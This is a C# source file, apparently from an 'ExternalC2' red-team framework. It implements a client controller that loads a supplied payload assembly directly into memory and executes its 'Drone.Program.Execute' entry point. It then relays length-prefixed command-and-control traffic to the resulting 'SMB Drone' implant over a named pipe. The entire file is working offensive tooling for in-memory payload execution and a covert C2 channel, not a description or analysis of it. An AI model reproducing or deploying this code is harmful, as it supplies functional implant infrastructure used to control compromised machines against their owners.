using System;
using System.IO;
using System.IO.Pipes;
using System.Reflection;
using System.Threading.Tasks;

namespace ExternalC2.Net.Client;

/// <summary>
/// Controller to handle connection to SMB Drone
/// </summary>
public sealed class ClientController : IDisposable
{
    private readonly NamedPipeClientStream _client;
    
    /// <summary>
    /// 
    /// </summary>
    /// <param name="pipename">The pipename of the SMB Drone</param>
    public ClientController(string pipename)
    {
        _client = new NamedPipeClientStream(".", pipename, PipeDirection.InOut);
    }

    /// <summary>
    /// Indicates whether the named pipe is still connected
    /// </summary>
    public bool Connected
        => _client is not null && _client.IsConnected;

    /// <summary>
    /// Executes and connects to the SMB Drone
    /// </summary>
    /// <param name="payload"></param>
    /// <returns></returns>
    public async Task<bool> ExecutePayload(byte[] payload)
    {
        // load drone
        var asm = Assembly.Load(payload);
        asm.GetType("Drone.Program")!.GetMethod("Execute")!.Invoke(null, Array.Empty<object>());
        
        // wait a bit
        await Task.Delay(new TimeSpan(0, 0, 3));
        
        try
        {
            // connect to pipe
            await _client.ConnectAsync();
        }
        catch
        {
            // pokemon
        }

        return Connected;
    }

    /// <summary>
    /// Read data from the Drone
    /// </summary>
    /// <returns></returns>
    /// <exception cref="Exception"></exception>
    public async Task<byte[]> ReadDrone()
    {
        // read length
        var lengthBuf = new byte[4];
        var read = await _client.ReadAsync(lengthBuf, 0, 4);

        if (read != 4)
            throw new Exception("Failed to read length");

        var length = BitConverter.ToInt32(lengthBuf, 0);
        
        // read rest of data
        using var ms = new MemoryStream();
        var totalRead = 0;
        
        do
        {
            var buf = new byte[1024];
            read = await _client.ReadAsync(buf, 0, buf.Length);

            await ms.WriteAsync(buf, 0, read);
            totalRead += read;
        }
        while (totalRead < length);
        
        return ms.ToArray();
    }

    /// <summary>
    /// Send data to the Drone
    /// </summary>
    /// <param name="data"></param>
    /// <exception cref="Exception"></exception>
    public async Task SendDrone(byte[] data)
    {
        // format data as [length][value]
        var lengthBuf = BitConverter.GetBytes(data.Length);
        var lv = new byte[lengthBuf.Length + data.Length];

        Buffer.BlockCopy(lengthBuf, 0, lv, 0, lengthBuf.Length);
        Buffer.BlockCopy(data, 0, lv, lengthBuf.Length, data.Length);
        
        using var ms = new MemoryStream(lv);

        // write in chunks
        var bytesRemaining = lv.Length;
        do
        {
            var lengthToSend = bytesRemaining < 1024 ? bytesRemaining : 1024;
            var buf = new byte[lengthToSend];
            
            var read = await ms.ReadAsync(buf, 0, lengthToSend);

            if (read != lengthToSend)
                throw new Exception("Could not read data from stream");
            
            await _client.WriteAsync(buf, 0, buf.Length);
            
            bytesRemaining -= lengthToSend;
        }
        while (bytesRemaining > 0);
    }

    public void Dispose()
    {
        _client.Dispose();
    }
}